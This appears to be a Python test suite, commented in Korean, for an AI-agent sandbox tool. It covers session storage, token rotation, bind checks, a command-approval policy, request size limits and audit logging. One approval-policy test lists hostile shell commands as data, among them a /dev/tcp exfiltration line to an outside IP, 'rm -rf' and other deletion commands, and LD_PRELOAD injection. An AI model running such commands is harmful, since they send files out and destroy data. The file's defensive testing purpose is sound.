"""세션 저장(SQLite)과 평문 HTTP 바인딩 막기. Docker 없이 돈다."""

import time

import pytest

from agentbox.cli import bind_problem, is_loopback, runtime_problem
from agentbox.config import Settings
from agentbox.policy import Policy, simple_programs
from agentbox.desktop import DesktopControl


def test_session_survives_restart(tmp_path):
    db = tmp_path / "a.db"
    cookie, public = DesktopControl(db_path=db).new_session()
    assert DesktopControl(db_path=db).session(cookie) == public  # 다시 띄워도 로그인 유지
    d = DesktopControl(db_path=db)
    assert d.end_session(cookie) == public
    assert DesktopControl(db_path=db).session(cookie) is None  # 로그아웃은 저장소에서 지운다


def test_human_token_rotation_drops_sessions_and_tickets(tmp_path):
    # run-3 v05: 사람 토큰을 바꿔도 예전 토큰으로 받은 브라우저 세션이 12시간 살아 있었다.
    db = tmp_path / "a.db"
    a = DesktopControl(db_path=db, token_gen="A")
    cookie, public = a.new_session()
    t = a.issue_ticket("*")
    assert DesktopControl(db_path=db, token_gen="A").session(cookie) == public   # 같은 토큰: 로그인 유지
    assert a.session(cookie) == public
    b = DesktopControl(db_path=db, token_gen="B")                                # 토큰 교체 후 재시작
    assert b.session(cookie) is None and b.redeem(t, "*") is None
    assert a.session(cookie) is None                                               # 행 자체가 지워졌다
    assert DesktopControl(db_path=db, token_gen="A").session(cookie) is None     # 되돌려도 살아나지 않는다


def test_session_db_without_token_column_is_migrated(tmp_path):
    import sqlite3
    db = tmp_path / "a.db"
    raw = sqlite3.connect(db)
    raw.executescript("""
CREATE TABLE ui_tickets (hash TEXT PRIMARY KEY, scope TEXT NOT NULL, expires REAL NOT NULL);
CREATE TABLE ui_sessions (hash TEXT PRIMARY KEY, public TEXT NOT NULL, created TEXT NOT NULL,
  expires REAL NOT NULL, scope TEXT NOT NULL DEFAULT '*');
INSERT INTO ui_sessions VALUES ('h', 'hs_old', 'x', 9e99, '*');
""")
    raw.commit()
    d = DesktopControl(db_path=db, token_gen="A")      # 누가 내줬는지 모르는 예전 세션은 버린다
    assert raw.execute("SELECT COUNT(*) FROM ui_sessions").fetchone()[0] == 0
    cookie, public = d.new_session()
    assert DesktopControl(db_path=db, token_gen="A").session(cookie) == public


def test_token_gen_is_stable_and_distinct():
    from agentbox.desktop import token_gen
    assert token_gen("hum_a") == token_gen("hum_a") != token_gen("hum_b")
    assert "hum_a" not in token_gen("hum_a")


def test_ticket_survives_restart_once(tmp_path):
    db = tmp_path / "a.db"
    t = DesktopControl(db_path=db).issue_ticket("sb_1")
    d = DesktopControl(db_path=db)
    assert d.redeem(t, "sb_2") is None            # 다른 샌드박스용으로 쓰면 버려진다
    t = DesktopControl(db_path=db).issue_ticket("sb_1")
    assert DesktopControl(db_path=db).redeem(t, "sb_1")
    assert DesktopControl(db_path=db).redeem(t, "sb_1") is None  # 1회용


def test_expiry_uses_wall_clock(tmp_path):
    db = tmp_path / "a.db"
    d = DesktopControl(db_path=db, ticket_ttl=0.05, session_ttl=0.05)
    t = d.issue_ticket("*")
    cookie, _ = d.new_session()
    time.sleep(0.1)
    d2 = DesktopControl(db_path=db)
    assert d2.redeem(t, "*") is None and d2.session(cookie) is None


def test_sessions_without_scope_dropped_on_upgrade(tmp_path):
    """범위가 없던 때의 세션은 화면 링크용인지 알 수 없어 버린다 (다시 로그인)."""
    import sqlite3

    db = tmp_path / "a.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE ui_sessions (hash TEXT PRIMARY KEY, public TEXT NOT NULL, created TEXT NOT NULL,"
                " expires REAL NOT NULL)")
    con.execute("INSERT INTO ui_sessions VALUES ('h', 'hs_old', 't', ?)", (time.time() + 3600,))
    con.commit()
    con.close()
    d = DesktopControl(db_path=db)
    assert d._db.execute("SELECT COUNT(*) FROM ui_sessions").fetchone()[0] == 0
    cookie, public = d.new_session()
    assert d.session(cookie) == public


def test_secrets_stored_hashed(tmp_path):
    db = tmp_path / "a.db"
    d = DesktopControl(db_path=db)
    t = d.issue_ticket("*")
    cookie, _ = d.new_session()
    raw = db.read_bytes()
    assert t.encode() not in raw and cookie.encode() not in raw


def test_leftover_lease(tmp_path):
    db = tmp_path / "a.db"
    a = DesktopControl(db_path=db)
    a.take("sb_1", "hs_1")
    a.take("sb_2", "hs_2")
    a.release("sb_2")
    b = DesktopControl(db_path=db)
    left = b.leftover_leases()
    assert [x["sandbox_id"] for x in left] == ["sb_1"] and left[0]["session"] == "hs_1"
    b.forget_lease("sb_1")
    assert DesktopControl(db_path=db).leftover_leases() == []
    assert a.leftover_leases() == []  # 자기 실행의 인수는 남은 것으로 치지 않는다


@pytest.mark.parametrize("host,ok", [("127.0.0.1", True), ("::1", True), ("localhost", True),
                                     ("127.0.0.2", True), ("0.0.0.0", False), ("192.168.0.5", False),
                                     ("::", False), ("example.com", False)])
def test_loopback(host, ok):
    assert is_loopback(host) is ok


def test_bind_problem():
    assert bind_problem("127.0.0.1", tls=False, behind_tls_proxy=False) is None
    assert "TLS" in bind_problem("0.0.0.0", tls=False, behind_tls_proxy=False)
    assert bind_problem("0.0.0.0", tls=True, behind_tls_proxy=False) is None
    assert bind_problem("0.0.0.0", tls=False, behind_tls_proxy=True) is None


DEFAULT = Policy.load(Settings().policy_path)


@pytest.mark.parametrize("cmd", [
    "ls -la /workspace", "cat a.md | grep 매출 | wc -l", "cd /workspace && ls; pwd", "wc -c < big.txt",
    "ls 2>/dev/null", "head -n 5 a.md 2>&1", "sha256sum blob.bin; ls -a", "mkdir -p outbox", "echo hello",
])
def test_default_policy_allows_read_only_exec(cmd):
    assert DEFAULT.decide("exec", {"command": cmd}).action == "allow", cmd


@pytest.mark.parametrize("cmd", [
    "find . -delete", "python3 -c 'import shutil; shutil.rmtree(\"/workspace\")'", "echo hi > a.md",
    "cat a > /dev/tcp/203.0.113.7/443", "cat $(echo a)", "ls `id`", "sh -c 'ls'", "LD_PRELOAD=/x.so cat a",
    "ls |& python3 x.py", "ls; truncate -s0 a.md", "mv a b", "cp a b", "sed -i d a.md", "ls <(id)",
    "cat a\npython3 x.py", "for f in *; do cat $f; done", "rm -rf /workspace/*",
])
def test_default_policy_needs_approval(cmd):
    assert DEFAULT.decide("exec", {"command": cmd}).action == "require_approval", cmd


def test_simple_programs():
    assert simple_programs("/bin/ls -l && cat x | wc") == {"ls", "cat", "wc"}
    assert simple_programs("echo a > b") is None
    assert simple_programs("echo 'unclosed") is None
    assert DEFAULT.decide("list_dir", {"path": "/workspace"}).action == "allow"
    assert DEFAULT.decide("write_file", {"path": "/workspace/a"}).action == "allow"
    assert DEFAULT.decide("delete_file", {"path": "/workspace/a"}).action == "require_approval"


def test_runtime_problem():
    assert runtime_problem("runc", exposed=False) is None          # 127.0.0.1 개발용
    assert "runc" in runtime_problem("runc", exposed=True)
    for strong in ("runsc", "kata-fc", "kata-qemu-firecracker"):
        assert runtime_problem(strong, exposed=True) is None


def test_overlap_uses_filesystem_identity(tmp_path, monkeypatch):
    # run-3 v06: 경로 문자열만 비교해서, 같은 폴더의 다른 이름(대소문자를 가리지 않는 파일 시스템의 다른 철자,
    # 바인드 마운트)은 데이터 폴더와 겹쳐도 통과했다.
    import os
    from agentbox.sandbox import overlaps
    proj = tmp_path / "Users" / "Me" / "proj"
    (proj / "data").mkdir(parents=True)
    (tmp_path / "users" / "me" / "proj").mkdir(parents=True)
    other = tmp_path / "other"
    other.mkdir()
    data = proj / "data"
    assert overlaps(proj, data) and overlaps(data, data) and overlaps(data / "x", data)
    assert not overlaps(other, data)
    real = os.path.samefile
    monkeypatch.setattr(os.path, "samefile", lambda a, b: str(a).lower() == str(b).lower() or real(a, b))
    assert overlaps(tmp_path / "users" / "me" / "proj", data)   # 대소문자만 다른 철자
    assert not overlaps(other, data)


def test_overlap_sees_bind_mount_alias(tmp_path):
    import os
    import subprocess
    from agentbox.sandbox import overlaps
    # 바인드 마운트는 root가 필요하다. CI 러너처럼 root가 아니면 비밀번호 없는 sudo로 만든다.
    sudo = [] if os.geteuid() == 0 else ["sudo", "-n"]
    proj, alias = tmp_path / "proj", tmp_path / "alias"
    (proj / "data").mkdir(parents=True)
    alias.mkdir()
    if subprocess.run([*sudo, "mount", "--bind", str(proj), str(alias)], capture_output=True).returncode != 0:
        pytest.skip("바인드 마운트를 만들 수 없음")
    try:
        assert overlaps(alias, proj / "data")
    finally:
        subprocess.run([*sudo, "umount", str(alias)])


def _echo_app(seen):
    """본문을 끝까지 읽고 받은 바이트 수를 돌려주는 ASGI 앱."""
    async def app(scope, receive, send):
        seen["called"] = True
        total = 0
        while True:
            m = await receive()
            if m["type"] == "http.disconnect":
                break
            total += len(m.get("body", b""))
            if not m.get("more_body"):
                break
        seen["read"] = total
        await send({"type": "http.response.start", "status": 200, "headers": []})
        await send({"type": "http.response.body", "body": str(total).encode()})
    return app


def test_body_limit_rejects_before_reading():
    """보안 검수 run-4 F1: 인증보다 먼저 읽히는 본문이 상한을 넘으면 앱이 읽기 전에 413으로 끊는다."""
    from fastapi.testclient import TestClient
    from agentbox.api import _BodyLimit
    seen = {}
    c = TestClient(_BodyLimit(_echo_app(seen), json_max=1000, upload_max=5000))
    r = c.post("/sandboxes", content=b"x" * 2000)                  # Content-Length가 상한을 넘음
    assert r.status_code == 413 and "called" not in seen
    r = c.post("/sandboxes", content=iter([b"x" * 600, b"x" * 600, b"x" * 600]))  # 길이 없이 흘려 보냄
    assert r.status_code == 413 and seen["read"] <= 1000
    seen.clear()
    assert c.post("/sandboxes", content=b"x" * 900).text == "900"   # 상한 안은 그대로
    assert c.post("/sandboxes/sb_1/files", content=b"x" * 4000).text == "4000"   # 파일 넣기는 따로 큰 상한
    assert c.post("/sandboxes/sb_1/files", content=b"x" * 6000).status_code == 413
    assert c.post("/sandboxes", content=b"x", headers={"content-length": "abc"}).status_code == 413


def test_audit_payload_is_bounded(tmp_path):
    """보안 검수 run-4 F3: 어디서 기록하든 감사 행 크기가 묶이고, 묶은 값으로 해시를 계산해 검증이 통과한다."""
    import json
    import sqlite3
    from agentbox.audit import AUDIT_LIST_MAX, AUDIT_PAYLOAD_MAX, AUDIT_STR_MAX, AuditLog
    log = AuditLog(tmp_path / "a.db")
    small = {"request": 7, "error": "허용되지 않은 경로: /etc/x"}
    log.append(actor="system", event="tool_error", payload=small)
    log.append(actor="system", event="tool_error", payload={"request": 8, "error": "/etc/" + "A" * 131072})
    log.append(actor="system", event="approval_requested",
               payload={"approval_id": "apr_1", "preview": {"command": "c" * 10003, "notes": ["n"] * 2001}})
    log.append(actor="system", event="tool_request",
               payload={"request": 9, "args": {f"k{i}": "v" * 60000 for i in range(5)}})
    rows = log.list()
    assert rows[0]["payload"] == small                                     # 작은 값은 그대로
    err = rows[1]["payload"]["error"]
    assert len(err) < AUDIT_STR_MAX + 64 and err.endswith("자 생략)")
    notes = rows[2]["payload"]["preview"]["notes"]
    assert len(notes) == AUDIT_LIST_MAX + 1 and notes[-1] == "…(+1801개 생략)"
    assert rows[2]["payload"]["approval_id"] == "apr_1"
    big = rows[3]["payload"]                                              # 문자열 하나하나는 작아도 합이 큼
    assert big["payload_truncated"] and big["request"] == 9 and "args" not in big
    db = sqlite3.connect(tmp_path / "a.db")
    assert max(len(p.encode()) for (p,) in db.execute("SELECT payload FROM audit")) <= AUDIT_PAYLOAD_MAX
    assert log.verify().ok
    assert json.loads(db.execute("SELECT payload FROM audit WHERE id=1").fetchone()[0]) == small


def test_escape_controls_covers_invisible_and_bidi_marks():
    """보안 검수 run-4 N5: 손으로 나열한 문자 집합이 U+061C(ALM)와 폭 없는 문자·줄 구분자를 놓쳤다."""
    from agentbox.cli import _safe
    from agentbox.display import escape_controls
    hidden = "\u061c\u200b\u200c\u200d\u2060\ufeff\u00ad\u2028\u2029\u180e\U000e0041"
    for keep in (True, False):
        out = escape_controls("rm" + hidden + " x", keep_newlines=keep)
        assert not any(ch in out for ch in hidden), keep
        assert "\\u061c" in out and "\\xad" in out and "\\U000e0041" in out
        assert escape_controls("\u202e\x1b\r", keep) == "\\u202e\\x1b\\x0d"   # 예전에 막던 것도 그대로
    assert escape_controls("a\tb\nc", keep_newlines=True) == "a\tb\nc"
    assert escape_controls("a\tb\nc", keep_newlines=False) == "a\\x09b\\x0ac"
    assert escape_controls("한글 파일.txt é ✓", keep_newlines=False) == "한글 파일.txt é ✓"
    assert _safe("x\u2028y") == "x\\u2028y"
